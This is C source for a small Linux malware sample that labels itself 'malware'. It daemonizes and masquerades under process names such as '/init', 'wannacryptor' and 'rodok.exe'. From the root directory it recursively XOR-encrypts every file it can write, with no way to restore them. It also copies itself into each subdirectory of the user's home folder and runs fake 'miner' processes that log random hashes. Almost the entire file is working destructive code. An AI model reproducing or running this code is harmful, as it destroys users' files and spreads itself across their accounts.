//aman
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <dirent.h>
#include <sys/wait.h>
#include <limits.h>
#include <stdbool.h>
#include <signal.h>
#include <time.h>
#define XOR_KEY 0x55
#define HOME_PATH getenv("HOME")
#define BINARY_NAME "malware"
#define MAX_MINERS 5
#define MIN_DELAY 3
#define MAX_DELAY 30
#define HASH_LENGTH 64
#define LOG_FILE "/tmp/.miner.log"

int SOR_KEY;

void generate_hash(char *buffer, size_t length) {
    const char charset[] = "0123456789abcdef";
    for (size_t i = 0; i < length; i++) {
        buffer[i] = charset[rand() % 16];
    }
    buffer[length] = '\0';
}

void miner_process(int miner_id, char **argv) {
    char miner_name[32];
    snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", miner_id);
    prctl(PR_SET_NAME, miner_name, 0, 0, 0);
    strncpy(argv[0], miner_name, 128);

    while (1) {
        int delay = MIN_DELAY + rand() % (MAX_DELAY - MIN_DELAY + 1);
        sleep(delay);

        char hash[HASH_LENGTH + 1];
        generate_hash(hash, HASH_LENGTH);

        time_t now = time(NULL);
        struct tm *tm = localtime(&now);
        char timestamp[32];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm);

        char log_entry[256];
        snprintf(log_entry, sizeof(log_entry),
            "[%s][Miner %d] %s\n", timestamp, miner_id, hash);

        int fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd >= 0) {
            write(fd, log_entry, strlen(log_entry));
            close(fd);
        }
    }
}

void spread_binary() {
    char self_path[PATH_MAX];
    char target_path[PATH_MAX];
    DIR *dir;
    struct dirent *entry;

    if (readlink("/proc/self/exe", self_path, sizeof(self_path)-1) == -1) return;
    if ((dir = opendir(HOME_PATH)) == NULL) return;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR &&
            strcmp(entry->d_name, ".") != 0 &&
            strcmp(entry->d_name, "..") != 0) {

            snprintf(target_path, sizeof(target_path), "%s/%s/%s",
                     HOME_PATH, entry->d_name, BINARY_NAME);

            if (fork() == 0) {
                execlp("cp", "cp", self_path, target_path, NULL);
                exit(EXIT_FAILURE);
            }
            wait(NULL);
            chmod(target_path, 0755);
        }
    }
    closedir(dir);
}

void encrypt_file(const char *filename) {
    FILE *file = fopen(filename, "rb+");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *buffer = (unsigned char *)malloc(size);
    if (!buffer) {
        fclose(file);
        return;
    }

    fread(buffer, 1, size, file);
    for (long i = 0; i < size; i++) {
        buffer[i] ^= XOR_KEY;
    }

    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, size, file);
    free(buffer);
    fclose(file);
}

void process_directory(const char *dir_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    struct stat statbuf;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        if (stat(full_path, &statbuf) == -1) continue;

        if (S_ISDIR(statbuf.st_mode)) {
            process_directory(full_path);
        } else if (S_ISREG(statbuf.st_mode)) {
            encrypt_file(full_path);
        }
    }

    closedir(dir);
}

void wannacryptor_process() {
    process_directory(".");
}

int main(int argc, char *argv[]) {
    SOR_KEY = (int)time(NULL); // XOR key generated once
    srand(SOR_KEY);

    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    strncpy(argv[0], "/init", 128);




    
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); 

    umask(0);
    setsid();
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    int rodok_done = 0;
    int wanna_done = 0;
    int trojan_done = 0;

    while (1) {
        if (!wanna_done) {
            pid_t child = fork();
            if (child == 0) {
                prctl(PR_SET_PDEATHSIG, SIGKILL);
                prctl(PR_SET_NAME, "wannacryptor", 0, 0, 0);
                strncpy(argv[0], "wannacryptor", 128);
                wannacryptor_process();
                exit(0);
            }
            wanna_done = 1;
        }

        if (!trojan_done) {
            pid_t child = fork();
            if (child == 0) {
                prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);
                spread_binary();
                exit(0);
            }
            trojan_done = 1;
        }

        if (!rodok_done) {
            pid_t child = fork();
            if (child == 0) {
                prctl(PR_SET_PDEATHSIG, SIGKILL);
                prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);
                strncpy(argv[0], "rodok.exe", 128);
                remove(LOG_FILE);

                for (int i = 0; i < MAX_MINERS; i++) {
                    pid_t miner_pid = fork();
                    if (miner_pid == 0) {
                        prctl(PR_SET_PDEATHSIG, SIGKILL);
                        miner_process(i, argv);
                        exit(0);
                    }
                }

                while (1) sleep(60); 
            }
            rodok_done = 1;
        }

        sleep(30); 
    }

    return 0;
}
